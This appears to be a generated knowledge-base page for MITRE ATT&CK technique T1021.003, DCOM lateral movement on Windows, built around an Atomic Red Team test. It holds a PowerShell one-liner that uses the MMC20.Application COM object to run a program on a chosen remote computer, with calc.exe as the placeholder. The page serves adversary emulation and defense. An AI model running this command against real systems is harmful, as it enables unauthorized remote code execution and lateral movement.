
# Distributed Component Object Model

## Description

### MITRE Description

> Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)

Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)

Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1021/003

## Potential Commands

```
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
```

## Commands Dataset

```
[{'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
             '$null, $null, "7")\n',
  'name': None,
  'source': 'atomics/T1021.003/T1021.003.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Remote Services: Distributed Component Object Model': {'atomic_tests': [{'auto_generated_guid': '6dc74eb1-c9d6-4c53-b3b5-6f50ae339673',
                                                                                                   'description': 'Powershell '
                                                                                                                  'lateral '
                                                                                                                  'movement '
                                                                                                                  'using '
                                                                                                                  'the '
                                                                                                                  'mmc20 '
                                                                                                                  'application '
                                                                                                                  'com '
                                                                                                                  'object.\n'
                                                                                                                  '\n'
                                                                                                                  'Reference:\n'
                                                                                                                  '\n'
                                                                                                                  'https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n'
                                                                                                                  '\n'
                                                                                                                  'Upon '
                                                                                                                  'successful '
                                                                                                                  'execution, '
                                                                                                                  'cmd '
                                                                                                                  'will '
                                                                                                                  'spawn '
                                                                                                                  'calc.exe '
                                                                                                                  'on '
                                                                                                                  'a '
                                                                                                                  'remote '
                                                                                                                  'computer.\n',
                                                                                                   'executor': {'command': '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\\windows\\system32\\calc.exe", '
                                                                                                                           '$null, '
                                                                                                                           '$null, '
                                                                                                                           '"7")\n',
                                                                                                                'name': 'powershell'},
                                                                                                   'input_arguments': {'computer_name': {'default': 'localhost',
                                                                                                                                         'description': 'Name '
                                                                                                                                                        'of '
                                                                                                                                                        'Computer',
                                                                                                                                         'type': 'string'}},
                                                                                                   'name': 'PowerShell '
                                                                                                           'Lateral '
                                                                                                           'Movement '
                                                                                                           'using '
                                                                                                           'MMC20',
                                                                                                   'supported_platforms': ['windows']}],
                                                                                 'attack_technique': 'T1021.003',
                                                                                 'display_name': 'Remote '
                                                                                                 'Services: '
                                                                                                 'Distributed '
                                                                                                 'Component '
                                                                                                 'Object '
                                                                                                 'Model'}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations


* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)

* [Network Segmentation](../mitigations/Network-Segmentation.md)
    
* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    
* [Application Isolation and Sandboxing](../mitigations/Application-Isolation-and-Sandboxing.md)
    

# Actors

None
